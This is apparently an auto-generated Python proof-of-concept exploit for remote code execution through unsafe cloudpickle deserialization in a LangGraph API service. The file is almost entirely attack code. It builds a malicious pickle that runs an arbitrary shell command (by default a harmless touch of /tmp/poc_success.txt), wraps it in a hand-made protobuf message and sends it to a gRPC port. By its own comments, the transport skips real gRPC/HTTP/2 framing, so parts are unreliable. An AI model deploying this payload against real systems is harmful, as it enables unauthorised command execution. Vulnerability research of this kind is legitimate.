#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-002
# Sink: loads_typed
# Auto-generated — run with: python3 rce_code_deserializes_data_using_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure deserialization in langgraph_api_src.

Vulnerability: RCE via cloudpickle.loads() when encoding is 'pickle'.
The data flows from protobuf messages through serialized_value_from_proto()
to loads_typed() which calls cloudpickle.loads() on attacker-controlled data.

This PoC demonstrates the vulnerability by sending a malicious pickle payload
that executes a benign command (touch /tmp/poc_success.txt).
"""

import os
import sys
import pickle
import struct
import socket
import argparse
import subprocess
from typing import Optional

# Try to import cloudpickle; if not available, use standard pickle
try:
    import cloudpickle
except ImportError:
    cloudpickle = None
    print("[!] cloudpickle not available, using standard pickle (may not work)")
    print("[!] Install with: pip install cloudpickle")


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Uses __reduce__ to execute os.system() when unpickled.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    if cloudpickle:
        return cloudpickle.dumps(MaliciousPayload())
    else:
        return pickle.dumps(MaliciousPayload())


def create_protobuf_message(pickle_data: bytes) -> bytes:
    """
    Create a protobuf message that triggers the vulnerable code path.
    
    The message structure mimics what would be sent via gRPC:
    - encoding set to 'pickle'
    - value contains the malicious pickle data
    
    This is a simplified protobuf-like structure. In a real attack,
    you would use the actual protobuf definitions.
    """
    # Protobuf wire format for a message with:
    # field 1 (encoding): string, wire type 2 (length-delimited)
    # field 2 (value): bytes, wire type 2 (length-delimited)
    
    # Encoding field: tag=0x0a (field 1, wire type 2), length, "pickle"
    encoding_bytes = b"pickle"
    encoding_field = struct.pack("B", 0x0a)  # tag for field 1
    encoding_field += struct.pack("B", len(encoding_bytes))  # length
    encoding_field += encoding_bytes
    
    # Value field: tag=0x12 (field 2, wire type 2), length, pickle data
    value_field = struct.pack("B", 0x12)  # tag for field 2
    value_field += _encode_varint(len(pickle_data))  # length
    value_field += pickle_data
    
    return encoding_field + value_field


def _encode_varint(value: int) -> bytes:
    """Encode an integer as a protobuf varint."""
    result = []
    while value > 0x7f:
        result.append((value & 0x7f) | 0x80)
        value >>= 7
    result.append(value & 0x7f)
    return bytes(result)


def send_payload(host: str, port: int, payload: bytes) -> Optional[bytes]:
    """
    Send the malicious payload to the gRPC endpoint.
    
    This simulates sending a protobuf message to the vulnerable service.
    In a real attack, you would use the actual gRPC client.
    """
    try:
        # Create a TCP connection to the gRPC server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Send HTTP/2 preface (simplified - real gRPC uses HTTP/2)
        # For this PoC, we just send the raw protobuf data
        sock.sendall(payload)
        
        # Try to receive response
        response = sock.recv(4096)
        sock.close()
        return response
        
    except socket.timeout:
        print("[!] Connection timed out")
        return None
    except ConnectionRefusedError:
        print("[!] Connection refused - is the service running?")
        return None
    except Exception as e:
        print(f"[!] Error sending payload: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api_src insecure deserialization RCE"
    )
    parser.add_argument(
        "--host",
        default="localhost",
        help="Target host (default: localhost)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=50051,
        help="Target port (default: 50051)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Only create the payload, don't send it"
    )
    
    args = parser.parse_args()
    
    print("[*] Creating malicious pickle payload...")
    pickle_data = create_malicious_pickle(args.command)
    print(f"[*] Pickle payload size: {len(pickle_data)} bytes")
    
    print("[*] Creating protobuf message...")
    protobuf_message = create_protobuf_message(pickle_data)
    print(f"[*] Protobuf message size: {len(protobuf_message)} bytes")
    
    if args.dry_run:
        print("\n[*] Dry run - payload created but not sent")
        print(f"[*] Command would be: {args.command}")
        print(f"[*] Pickle data (hex): {pickle_data.hex()}")
        return
    
    print(f"\n[*] Sending payload to {args.host}:{args.port}...")
    print(f"[*] Command to execute: {args.command}")
    
    response = send_payload(args.host, args.port, protobuf_message)
    
    if response:
        print(f"[*] Received response ({len(response)} bytes)")
        print(f"[*] Response (hex): {response.hex()}")
    else:
        print("[*] No response received (may still have executed)")
    
    # Check if the command was executed
    if args.command.startswith("touch "):
        target_file = args.command.split()[-1]
        if os.path.exists(target_file):
            print(f"\n[+] SUCCESS! File '{target_file}' was created.")
            print("[+] The vulnerability is exploitable!")
        else:
            print(f"\n[-] File '{target_file}' was not found.")
            print("[-] The exploit may not have worked, or the service is not vulnerable.")
    else:
        print("\n[*] Custom command used - check manually if it executed.")


if __name__ == "__main__":
    print("=" * 60)
    print("langgraph_api_src Insecure Deserialization PoC")
    print("=" * 60)
    print()
    
    main()
